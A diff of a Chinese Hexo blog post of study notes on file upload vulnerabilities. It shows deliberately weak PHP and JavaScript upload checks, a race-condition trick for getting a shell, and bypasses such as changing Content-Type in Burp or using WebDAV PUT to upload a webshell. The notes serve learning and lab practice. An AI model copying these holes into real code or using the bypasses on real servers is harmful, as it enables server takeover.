@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="文件上传漏洞," />
 
 
 
@@ -79,12 +79,32 @@
 
 
 
-<meta name="description" content="文件上传+文件包含漏洞学习笔记+靶场实战[TOC] 文件上传漏洞部分文件上传漏洞一.什么是文件上传漏洞  文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的. 二.文件上传漏洞危害  网站被控制，对文件增删改查，执行命令，链接数据库 如果服务器长久未更新，可以利用exp提权，导致服务器沦陷 同服务器的其他网站沦陷。  二.文">
+<meta name="description" content="文件上传漏洞学习笔记+靶场实战一.什么是文件上传漏洞  文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的. 关于PHP中$_FILES数组的使用方法 $_FILES\[‘file’][‘name’] 客户端文件名称  $_FILES\[‘file’][‘type’] 文件的MIME类型  $_FILES\[‘file’][">
 <meta property="og:type" content="article">
-<meta property="og:title" content="“文件上传漏洞学习">
+<meta property="og:title" content="文件上传漏洞学习">
 <meta property="og:url" content="https://shu1l.github.io/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="文件上传+文件包含漏洞学习笔记+靶场实战[TOC] 文件上传漏洞部分文件上传漏洞一.什么是文件上传漏洞  文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的. 二.文件上传漏洞危害  网站被控制，对文件增删改查，执行命令，链接数据库 如果服务器长久未更新，可以利用exp提权，导致服务器沦陷 同服务器的其他网站沦陷。  二.文">
+<meta property="og:description" content="文件上传漏洞学习笔记+靶场实战一.什么是文件上传漏洞  文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的. 关于PHP中$_FILES数组的使用方法 $_FILES\[‘file’][‘name’] 客户端文件名称  $_FILES\[‘file’][‘type’] 文件的MIME类型  $_FILES\[‘file’][">
+<meta property="og:image" content="https://images.seebug.org/content/images/2018/04/523aeb43-b1a1-421b-b809-79ec1bdb06f8.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2018/04/8a4f633f-06eb-45e2-b4ba-6b064755e12e.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2018/04/6dd812e6-eb1e-417b-96bd-d5f2e28b9aff.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2018/04/5b991dc4-d954-4d9c-8c9f-78c664b46bb2.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2018/04/e1c080a6-7aea-4e60-b007-20541c72db62.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2018/04/1bb9ff63-9b8c-415e-bc9a-69f843b97ee5.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2018/04/e0906f72-9da9-403c-a942-ba3771a931e0.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2018/04/a7ae783e-9275-4e41-9c70-c899396fb012.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2018/04/cd2f1355-be07-4c63-a802-0aa991bf2197.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2018/04/0bd2ce6f-25e0-4f59-b004-957ff71b1fd9.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2018/04/d86eaa81-9a84-40dc-9347-6c5bfdbfeaf6.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2018/04/f7b360e4-e055-43b7-ae94-b98419256476.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2018/04/1ca10020-3739-4def-b0e1-f4b004a1f196.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2018/04/ae0437ec-b9f5-48db-a28f-75408445c23f.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2018/04/c4f02267-e336-41c1-9423-3c86fa81856b.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2018/04/80c9d74a-d9bc-411c-af2a-a704eb5e1aff.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2018/04/6b945737-c4b4-4350-a5ba-972b35b09fda.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2018/04/b3625731-9f1d-4889-8609-b357b61a2368.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2018/04/95eabfd7-54b0-4f0f-971f-2316423fac33.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2018/04/389b0352-5ba1-4d7c-8d77-198dab060856.png-w331s">
 <meta property="og:image" content="https://shu1l.github.io/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/11525934-e19630249b9b8764.png">
 <meta property="og:image" content="https://shu1l.github.io/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/QQ%E6%88%AA%E5%9B%BE20200115201219.png">
 <meta property="og:image" content="https://shu1l.github.io/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/QQ%E6%88%AA%E5%9B%BE20200115201548.png">
@@ -102,10 +122,11 @@
 <meta property="og:image" content="https://shu1l.github.io/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/QQ%E6%88%AA%E5%9B%BE20200115211730.png">
 <meta property="og:image" content="https://shu1l.github.io/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/QQ%E6%88%AA%E5%9B%BE20200115211949.png">
 <meta property="article:published_time" content="2020-04-03T08:49:18.000Z">
-<meta property="article:modified_time" content="2020-04-03T11:50:44.243Z">
+<meta property="article:modified_time" content="2020-04-20T06:12:04.469Z">
 <meta property="article:author" content="Shu1L">
+<meta property="article:tag" content="文件上传漏洞">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://shu1l.github.io/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/11525934-e19630249b9b8764.png">
+<meta name="twitter:image" content="https://images.seebug.org/content/images/2018/04/523aeb43-b1a1-421b-b809-79ec1bdb06f8.png-w331s">
 
 
 
@@ -141,7 +162,7 @@
 
 
 
-  <title>“文件上传漏洞学习 | Hexo</title>
+  <title>文件上传漏洞学习 | Hexo</title>
   
 
 
@@ -295,7 +316,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">“文件上传漏洞学习</h1>
+          <h1 class="post-title" itemprop="name headline">文件上传漏洞学习</h1>
         
 
         <div class="post-meta">
@@ -317,6 +338,28 @@
             
           </span>
 
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">web漏洞学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -345,17 +388,428 @@
       
 
       
-        <h1 id="文件上传-文件包含漏洞学习笔记-靶场实战"><a href="#文件上传-文件包含漏洞学习笔记-靶场实战" class="headerlink" title="文件上传+文件包含漏洞学习笔记+靶场实战"></a>文件上传+文件包含漏洞学习笔记+靶场实战</h1><p>[TOC]</p>
-<h2 id="文件上传漏洞部分"><a href="#文件上传漏洞部分" class="headerlink" title="文件上传漏洞部分"></a>文件上传漏洞部分</h2><h4 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h4><p><strong>一.什么是文件上传漏洞</strong></p>
-<p> 文件上传<a href="http://www.2cto.com/" target="_blank" rel="noopener">漏洞</a>是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的.</p>
-<p><strong>二.文件上传漏洞危害</strong></p>
-<ul>
-<li>网站被控制，对文件增删改查，执行命令，链接数据库</li>
-<li>如果服务器长久未更新，可以利用exp提权，导致服务器沦陷</li>
-<li>同服务器的其他网站沦陷。</li>
+        <h1 id="文件上传漏洞学习笔记-靶场实战"><a href="#文件上传漏洞学习笔记-靶场实战" class="headerlink" title="文件上传漏洞学习笔记+靶场实战"></a>文件上传漏洞学习笔记+靶场实战</h1><h4 id="一-什么是文件上传漏洞"><a href="#一-什么是文件上传漏洞" class="headerlink" title="一.什么是文件上传漏洞"></a>一.什么是文件上传漏洞</h4><p>  文件上传<a href="http://www.2cto.com/" target="_blank" rel="noopener">漏洞</a>是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的.</p>
+<p><strong>关于PHP中$_FILES数组的使用方法</strong></p>
+<pre><code>$_FILES\[‘file’][‘name’] 客户端文件名称
+
+$_FILES\[‘file’][‘type’] 文件的MIME类型
+
+$_FILES\[‘file’][‘size’] 文件大小 单位字节
+
+$_FILES\[‘file’][‘tmp_name’] 文件被上传后在服务器端临时文件名，可以在php.ini中指定</code></pre><p>需要注意的是在文件上传结束后，默认的被储存在临时文件夹中，这时必须把他从临时目录中删除或移动到其他地方，否则，脚本运行完毕后，自动删除临时文件，可以使用copy或者<code>move_uploaded_file</code>两个函数</p>
+<h5 id="文件上传中常见的函数错误"><a href="#文件上传中常见的函数错误" class="headerlink" title="文件上传中常见的函数错误"></a>文件上传中常见的函数错误</h5><p><strong>这些函数有:<code>empty()、isset()、strpos()、rename()</code>等，如下面的代码:</strong></p>
+<pre><code>#!php
+if($operateId == 1){
+    $date = date(&quot;Ymd&quot;);
+    $dest = $CONFIG-&gt;basePath.&quot;data/files/&quot;.$date.&quot;/&quot;;
+    $COMMON-&gt;createDir($dest);
+    //if (!is_dir($dest))   mkdir($dest, 0777);
+    $nameExt = strtolower($COMMON-&gt;getFileExtName($_FILES[&#39;Filedata&#39;][&#39;name&#39;]));
+    $allowedType = array(&#39;jpg&#39;, &#39;gif&#39;, &#39;bmp&#39;, &#39;png&#39;, &#39;jpeg&#39;);
+    if(!in_array($nameExt, $allowedType)){
+        $msg = 0;
+    }
+    if(empty($msg)){
+        $filename = getmicrotime().&#39;.&#39;.$nameExt;
+        $file_url = urlencode($CONFIG-&gt;baseUrl.&#39;data/files/&#39;.$date.&quot;/&quot;.$filename);
+        $filename = $dest.$filename;
+        if(empty($_FILES[&#39;Filedata&#39;][&#39;error&#39;])){
+            move_uploaded_file($_FILES[&#39;Filedata&#39;][&#39;tmp_name&#39;],$filename);
+        }
+        if (file_exists($filename)){
+            //$msg = 1;
+            $msg = $file_url;
+            @chmod($filename, 0444);
+        }else{
+            $msg = 0;
+        }
+    }
+    $outMsg = &quot;fileUrl=&quot;.$msg;
+    $_SESSION[&quot;eoutmsg&quot;] = $outMsg;
+    exit;
+}</code></pre><h4 id="历史经典漏洞再次爆发"><a href="#历史经典漏洞再次爆发" class="headerlink" title="历史经典漏洞再次爆发"></a>历史经典漏洞再次爆发</h4><p>条件竞争漏洞,这类历史经典漏洞在逐渐淡出人们视线的时候,再次爆发..</p>
+<p>接着看下面这段代码(摘自某VPN系统)</p>
+<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#!php</span>
+<span class="token delimiter">&lt;?</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'realfile'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">copy</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'realfile'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">mb_convert_encoding</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>file<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"GBK"</span><span class="token punctuation">,</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Pragma:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Cache-Control:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-type:application/octet-stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Length:"</span><span class="token punctuation">.</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>path<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Disposition:attachment;filename=\"$file\""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>path<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'realfile'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span></code></pre>
+<p>上述代码的逻辑表面上看起来是这样的(对于攻击者来说)：</p>
+<p>利用copy函数，将realfile生成shell.php-→删除掉shell.php</p>
+<p>这样初看起来没办法利用，但是仔细一想, 这段代码其实是存在逻辑问题的，所以我们可以利用这个逻辑缺陷达到GetShell的目的。</p>
+<p>具体利用方法：</p>
+<p>copy成temp.php–&gt;不断访问temp.php-&gt;temp.php生成shell.php-&gt;删除temp.php</p>
+<h4 id="校验方式分类-amp-总结"><a href="#校验方式分类-amp-总结" class="headerlink" title="校验方式分类&amp;总结"></a>校验方式分类&amp;总结</h4><ul>
+<li>客户端javascript校验（一般只校验后缀名）</li>
+<li>服务端校验</li>
+<li>文件头content-type字段校验（image/gif）</li>
+<li>文件内容头校验（GIF89a）</li>
+<li>后缀名黑名单校验</li>
+<li>后缀名白名单校验</li>
+<li>自定义正则校验</li>
+<li>WAF设备校验（根据不同的WAF产品而定）</li>
 </ul>
-<p><strong>二.文件上传漏洞的主要利用和绕过方式总结。</strong></p>
-<p><strong>1.前端JS绕过</strong></p>
+<h4 id="校验方式溯源"><a href="#校验方式溯源" class="headerlink" title="校验方式溯源"></a>校验方式溯源</h4><p>​    通常一个文件以HTTP协议进行上传时，将以POST请求发送至Web服务器，Web服务器接收到请求并同意后，用户与Web服务器将建立连接，并传输数据。一般文件上传过程中将会经过如下几个检测步骤：</p>
+<p><img src="https://images.seebug.org/content/images/2018/04/523aeb43-b1a1-421b-b809-79ec1bdb06f8.png-w331s" alt="img"></p>
+<h4 id="校验方式-amp-绕过姿势"><a href="#校验方式-amp-绕过姿势" class="headerlink" title="校验方式&amp;绕过姿势"></a>校验方式&amp;绕过姿势</h4><h5 id="PUT方法"><a href="#PUT方法" class="headerlink" title="PUT方法"></a>PUT方法</h5><p>WebDAV是一种基于 HTTP 1.1协议的通信协议.它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法。使应用程序可直接对Web Server直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。当WebDAV开启PUT，MOVE，COPY，DELETE方法时，攻击者就可以向服务器上传危险脚本文件。</p>
+<p>此时可以使用OPTIONS探测服务器支持的http方法，如果支持PUT，就进行上传脚本文件，在通过MOVE或COPY方法改名。当开启DELETE时还可以删除文件。</p>
+<p>参考:<a href="http://wiki.wooyun.org/server:httpput" target="_blank" rel="noopener">http://wiki.wooyun.org/server:httpput</a></p>
+<h4 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h4><h5 id="JavaScript校验"><a href="#JavaScript校验" class="headerlink" title="JavaScript校验"></a>JavaScript校验</h5><p>验证代码</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">?</span>php
+<span class="token comment" spellcheck="true">//文件上传漏洞演示脚本之js验证</span>
+$uploaddir <span class="token operator">=</span> <span class="token string">'uploads/'</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span>$uploaddir<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span>$_FILES<span class="token punctuation">[</span><span class="token string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> $uploaddir <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            echo <span class="token string">'文件上传成功，保存于：'</span> <span class="token punctuation">.</span> $uploaddir <span class="token punctuation">.</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token function">exit</span><span class="token punctuation">(</span>$uploaddir <span class="token punctuation">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token comment" spellcheck="true">//print_r($_FILES);</span>
+<span class="token punctuation">}</span>
+<span class="token operator">?</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html PUBLIC <span class="token string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span>
+    <span class="token string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>html xmlns<span class="token operator">=</span><span class="token string">"http://www.w3.org/1999/xhtml"</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>head<span class="token operator">></span>
+    <span class="token operator">&lt;</span>meta http<span class="token operator">-</span>equiv<span class="token operator">=</span><span class="token string">"Content-Type"</span> content<span class="token operator">=</span><span class="token string">"text/html;charset=gbk"</span><span class="token operator">/</span><span class="token operator">></span>
+    <span class="token operator">&lt;</span>meta http<span class="token operator">-</span>equiv<span class="token operator">=</span><span class="token string">"content-language"</span> content<span class="token operator">=</span><span class="token string">"zh-CN"</span><span class="token operator">/</span><span class="token operator">></span>
+    <span class="token operator">&lt;</span>title<span class="token operator">></span>文件上传漏洞演示脚本<span class="token operator">--</span>JS验证实例<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span>
+    <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>
+       <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">var</span> file <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">'upfile'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> file <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"你还没有选择任何文件，不能上传!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token comment" spellcheck="true">//定义允许上传的文件类型</span>
+            <span class="token keyword">var</span> allow_ext <span class="token operator">=</span> <span class="token string">".jpg|.jpeg|.png|.gif|.bmp|"</span><span class="token punctuation">;</span>
+            <span class="token comment" spellcheck="true">//提取上传文件的类型</span>
+            <span class="token keyword">var</span> ext_name <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token comment" spellcheck="true">//alert(ext_name);</span>
+            <span class="token comment" spellcheck="true">//alert(ext_name + "|");</span>
+            <span class="token comment" spellcheck="true">//判断上传文件类型是否允许上传</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>allow_ext<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>ext_name <span class="token operator">+</span> <span class="token string">"|"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">var</span> errMsg <span class="token operator">=</span> <span class="token string">"该文件不允许上传，请上传"</span> <span class="token operator">+</span> allow_ext <span class="token operator">+</span> <span class="token string">"类型的文件,当前文件类型为："</span> <span class="token operator">+</span>     ext_name<span class="token punctuation">;</span>
+                <span class="token function">alert</span><span class="token punctuation">(</span>errMsg<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
+<span class="token operator">&lt;</span>body<span class="token operator">></span>
+<span class="token operator">&lt;</span>h3<span class="token operator">></span>文件上传漏洞演示脚本<span class="token operator">--</span>JS验证实例<span class="token operator">&lt;</span><span class="token operator">/</span>h3<span class="token operator">></span>
+<span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string">""</span> method<span class="token operator">=</span><span class="token string">"post"</span> enctype<span class="token operator">=</span><span class="token string">"multipart/form-data"</span> name<span class="token operator">=</span><span class="token string">"upload"</span> onsubmit<span class="token operator">=</span><span class="token string">"return     checkFile()"</span><span class="token operator">></span>
+    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"MAX_FILE_SIZE"</span> value<span class="token operator">=</span><span class="token string">"204800"</span><span class="token operator">/</span><span class="token operator">></span>
+    请选择要上传的文件：<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"file"</span> name<span class="token operator">=</span><span class="token string">"upfile"</span><span class="token operator">/</span><span class="token operator">></span>
+    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"submit"</span> name<span class="token operator">=</span><span class="token string">"submit"</span> value<span class="token operator">=</span><span class="token string">"上传"</span><span class="token operator">/</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span></code></pre>
+<p>客户端JS验证通常做法是验证上传文件的扩展名是否符合验证条件</p>
+<h5 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h5><p>1.通过firefox的F12修改js代码绕过验证 2.使用burp抓包直接提交，绕过js验证</p>
+<h4 id="服务器端校验"><a href="#服务器端校验" class="headerlink" title="服务器端校验"></a>服务器端校验</h4><h5 id="文件头content-type字段校验（服务端MIME类型检测）"><a href="#文件头content-type字段校验（服务端MIME类型检测）" class="headerlink" title="文件头content-type字段校验（服务端MIME类型检测）"></a>文件头content-type字段校验（服务端MIME类型检测）</h5><h5 id="MIME类型介绍"><a href="#MIME类型介绍" class="headerlink" title="MIME类型介绍"></a>MIME类型介绍</h5><p><strong>MIME type</strong>的缩写为<strong>(Multipurpose Internet Mail Extensions)</strong>代表互联网媒体类型(Internet media type)，MIME使用一个简单的字符串组成，最初是为了标识邮件Email附件的类型，在html文件中可以使用content-type属性表示，描述了文件类型的互联网标准。</p>
+<p>Internet中有一个专门组织IANA来确认标准的MIME类型，但Internet发展的太快，很多应用程序等不及IANA来确认他们使用的MIME类型为标准类型。因此他们使用在类别中以x-开头的方法标识这个类别还没有成为标准，例如：x-gzip，x-tar等。事实上这些类型运用的很广泛，已经成为了事实标准。只要客户机和服务器共同承认这个MIME类型，即使它是不标准的类型也没有关系，客户程序就能根据MIME类型，采用具体的处理手段来处理数据。</p>
+<p>Response对象通过设置ContentType使客户端浏览器，区分不同种类的数据，并根据不同的MIME调用浏览器内不同的程序嵌入模块来处理相应的数据。</p>
+<h6 id="MIME类型格式："><a href="#MIME类型格式：" class="headerlink" title="MIME类型格式："></a>MIME类型格式：</h6><p>类别/子类别;参数 Content-Type: [type]/[subtype]; parameter</p>
+<h6 id="MIME主类别："><a href="#MIME主类别：" class="headerlink" title="MIME主类别："></a>MIME主类别：</h6><p>text：用于标准化地表示的文本信息，文本消息可以是多种字符集和或者多种格式的；</p>
+<p>Multipart：用于连接消息体的多个部分构成一个消息，这些部分可以是不同类型的数据；</p>
+<p>Application：用于传输应用程序数据或者二进制数据；</p>
+<p>Message：用于包装一个E-mail消息；</p>
+<p>Image：用于传输静态图片数据；</p>
+<p>Audio：用于传输音频或者音声数据；</p>
+<p>Video：用于传输动态影像数据，可以是与音频编辑在一起的视频数据格式。</p>
+<h6 id="常见MIME类型："><a href="#常见MIME类型：" class="headerlink" title="常见MIME类型："></a>常见MIME类型：</h6><p><img src="https://images.seebug.org/content/images/2018/04/8a4f633f-06eb-45e2-b4ba-6b064755e12e.png-w331s" alt="img"></p>
+<h5 id="验证代码"><a href="#验证代码" class="headerlink" title="验证代码"></a>验证代码</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILE</span><span class="token punctuation">[</span><span class="token string">'userfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"image/gif"</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//检测content-type</span>
+    <span class="token keyword">echo</span> <span class="token string">"sorry,we only allow uploading GIF images"</span><span class="token punctuation">;</span>
+    exit<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">else</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string">"Upload success!"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span></code></pre>
+<p>以上是一个简单的服务器上传验证代码，只要content-type符合image/gif就允许上传</p>
+<h5 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h5><p>使用Burp截取上传数据包，修改Content-Type的值，改为image/gif即可成功绕过上传webshell</p>
+<h4 id="服务端文件扩展名检测"><a href="#服务端文件扩展名检测" class="headerlink" title="服务端文件扩展名检测"></a>服务端文件扩展名检测</h4><h5 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$type</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span><span class="token string">"php3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">//判断上传文件类型</span>
+<span class="token variable">$fileext</span> <span class="token operator">=</span> <span class="token function">fileext</span><span class="token punctuation">(</span><span class="token variable">$_FILE</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$fileext</span><span class="token punctuation">,</span><span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string">"upload success!"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
